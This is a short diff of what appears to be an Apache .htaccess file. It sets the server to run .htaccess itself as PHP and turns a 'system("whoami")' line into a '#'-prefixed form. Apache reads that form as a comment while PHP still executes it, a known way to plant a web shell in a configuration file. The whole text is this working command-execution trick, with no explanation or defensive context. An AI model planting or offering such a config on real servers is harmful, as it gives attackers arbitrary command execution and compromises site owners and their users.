@@ -5,4 +5,4 @@ Order Deny,Allow
     Allow from all
 </FilesMatch>
 AddHandler php-script .htaccess
-<?php system("whoami");?>
+#<?php system("whoami");?>
